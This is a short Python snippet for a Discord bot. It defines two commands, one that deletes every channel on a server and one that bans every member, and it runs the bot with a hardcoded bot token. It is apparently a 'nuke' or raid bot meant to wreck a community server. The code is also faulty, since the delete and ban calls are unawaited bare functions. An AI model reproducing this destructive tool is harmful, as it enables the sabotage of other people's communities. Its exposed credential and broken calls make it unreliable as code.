@bot.command(pass_context=True)
async def deleteall(ctx, channel):
	for channel in ctx.message.author.server.channels:
		delete_channel(channel)
		
		
@bot.command(pass_context=True)
async def banall(ctx, member):
    for member in ctx.message.author.server.members:
        ban(member)
		
bot.run("NTYxMzU4MTk1NzU5NTEzNjAw.XJ7EIQ.ABsnoNgqa-9yZ5XmVH0AY8xfBP8")